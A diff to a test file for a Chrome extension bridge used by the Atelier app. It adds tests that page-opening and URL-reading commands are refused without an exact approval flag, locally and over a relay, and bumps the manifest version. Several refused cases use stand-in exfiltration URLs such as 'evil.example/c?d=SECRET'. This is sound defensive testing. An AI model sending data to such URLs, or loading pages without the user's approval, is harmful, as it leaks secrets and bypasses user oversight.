@@ -130,10 +130,10 @@ function loadBackground({ manifest = SOURCE_MANIFEST, pages = {}, storage = {}, 
   h.ctx = ctx;
   h.run = (code) => vm.runInContext(code, ctx);
   h.run('TIMING.settle = 0');
-  // The Atelier tab in this browser, through bridge.js (the page only controls cmd and args). Replies are cloned out
-  // of the VM, as Chrome's messaging would, so they compare like ordinary objects.
-  h.local = (cmd, args, origin = APP) => new Promise((resolve) => {
-    const keep = h.events.message.fns[0]({ cmd, args }, { id: EXT_ID, origin, url: `${origin}/`, tab: { id: 1 } }, (r) => resolve(structuredClone(r)));
+  // The Atelier tab in this browser, through bridge.js (the page controls cmd, args and the approved flag). Replies are
+  // cloned out of the VM, as Chrome's messaging would, so they compare like ordinary objects.
+  h.local = (cmd, args, origin = APP, extra = {}) => new Promise((resolve) => {
+    const keep = h.events.message.fns[0]({ cmd, args, ...extra }, { id: EXT_ID, origin, url: `${origin}/`, tab: { id: 1 } }, (r) => resolve(structuredClone(r)));
     if (keep === false) setTimeout(() => resolve('ignored'), 5);
   });
   return h;
@@ -563,6 +563,46 @@ test('reading commands run without a confirmation, and never list Atelier or the
   assert.deepEqual(await h.local('constructor', {}), { ok: false, error: 'Unknown command constructor' });
 });
 
+test('opening a page or reading one by its address needs Atelier’s approval flag, locally and through the relay; a tab read doesn’t', async () => {
+  const h = loadBackground({ pages: { 7: repoPage() }, storage: { relayToken: 'a'.repeat(64), relayOrigin: APP } });
+  const created = [];
+  h.ctx.chrome.tabs.create = async ({ url }) => { created.push(url); h.pages[90 + created.length] = fakePage({ title: 'Loaded', url }); return { id: 90 + created.length }; };
+  const NEEDS = /needs the user’s approval in Atelier first, so nothing was loaded/;
+  // the Atelier tab (bridge.js): no flag, or anything but true, is refused before a tab is made
+  for (const extra of [{}, { approved: false }, { approved: 'true' }, { approved: 1 }]) {
+    for (const [cmd, args] of [['open', { url: 'https://evil.example/c?d=SECRET' }], ['read', { url: 'https://evil.example/r?d=SECRET' }], ['read', { tabId: 7, url: 'https://evil.example/r' }]]) {
+      const res = await h.local(cmd, args, APP, extra);
+      assert.equal(res.ok, false, `${cmd} ${JSON.stringify(extra)}`);
+      assert.match(res.error, NEEDS);
+    }
+  }
+  assert.deepEqual(created, [], 'no page was loaded');
+  // reading an open tab needs nothing
+  assert.equal((await h.local('read', { tabId: 7 })).ok, true);
+  // with the flag the page loads
+  const opened = await h.local('open', { url: 'https://example.com/a' }, APP, { approved: true });
+  assert.equal(opened.ok, true);
+  const read = await h.local('read', { url: 'https://example.com/b' }, APP, { approved: true });
+  assert.equal(read.ok, true);
+  assert.deepEqual(created, ['https://example.com/a', 'https://example.com/b']);
+  // through the relay: the same rule on the flag the server passes on
+  await until(() => h.sockets.length === 1, 'the relay socket');
+  const ws = h.sockets[0];
+  ws.readyState = 1; ws.onopen();
+  await ws.onmessage({ data: JSON.stringify({ id: 'o1', cmd: 'open', args: { url: 'https://evil.example/c?d=SECRET' } }) });
+  await ws.onmessage({ data: JSON.stringify({ id: 'o2', cmd: 'read', args: { url: 'https://evil.example/r?d=SECRET' }, approved: false }) });
+  await ws.onmessage({ data: JSON.stringify({ id: 'o3', cmd: 'open', args: { url: 'https://example.com/c' }, approved: true }) });
+  const replies = ws.sent.filter((x) => x !== 'ping').map((x) => JSON.parse(x));
+  assert.deepEqual(replies.map((r) => [r.id, r.ok]), [['o1', false], ['o2', false], ['o3', true]]);
+  for (const r of replies.slice(0, 2)) assert.match(r.error, NEEDS);
+  assert.deepEqual(created, ['https://example.com/a', 'https://example.com/b', 'https://example.com/c']);
+});
+
+test('bridge.js passes the page’s approved flag on, and only a real true', () => {
+  const bridge = read('bridge.js');
+  assert.match(bridge, /chrome\.runtime\.sendMessage\(\{ cmd: d\.cmd, args: d\.args \|\| \{\}, approved: d\.approved === true \}\)/);
+});
+
 // ── the remote path (the server relay) ──
 async function relayed(h) {
   await until(() => h.sockets.length === 1, 'the relay socket');
@@ -852,8 +892,8 @@ test('confirm.html: no inline script (MV3 extension pages forbid it), and the pa
 });
 
 // ── packing ──
-test('manifest: version 1.3.1, a description Chrome accepts, and a Chrome new enough for the worker keep-alives', () => {
-  assert.equal(SOURCE_MANIFEST.version, '1.3.1');
+test('manifest: version 1.3.2, a description Chrome accepts, and a Chrome new enough for the worker keep-alives', () => {
+  assert.equal(SOURCE_MANIFEST.version, '1.3.2');
   assert.ok(SOURCE_MANIFEST.description.length <= 132);
   assert.ok(Number(SOURCE_MANIFEST.minimum_chrome_version) >= 116);
 });
@@ -867,7 +907,7 @@ test('the production pack drops localhost everywhere; the dev pack keeps it; bot
   const prod = packExtension();
   const files = unzipSync(prod.zip);
   const manifest = JSON.parse(strFromU8(files['manifest.json']));
-  assert.equal(manifest.version, '1.3.1');
+  assert.equal(manifest.version, '1.3.2');
   assert.deepEqual(manifest.content_scripts.map((c) => c.matches), [['https://atelier.ciprari.ai/*']]);
   assert.deepEqual(manifest.host_permissions, ['<all_urls>']);
   assert.ok(!/localhost|127\.0\.0\.1/.test(strFromU8(files['manifest.json'])));
@@ -876,7 +916,7 @@ test('the production pack drops localhost everywhere; the dev pack keeps it; bot
 
   const dev = packExtension({ dev: true });
   assert.deepEqual(dev.manifest.content_scripts[0].matches, ['https://atelier.ciprari.ai/*', 'http://localhost:8787/*']);
-  assert.equal(dev.manifest.version, '1.3.1');
+  assert.equal(dev.manifest.version, '1.3.2');
   assert.deepEqual(SOURCE_MANIFEST.content_scripts[0].matches, dev.manifest.content_scripts[0].matches, 'the source keeps localhost for Load unpacked');
 });
 
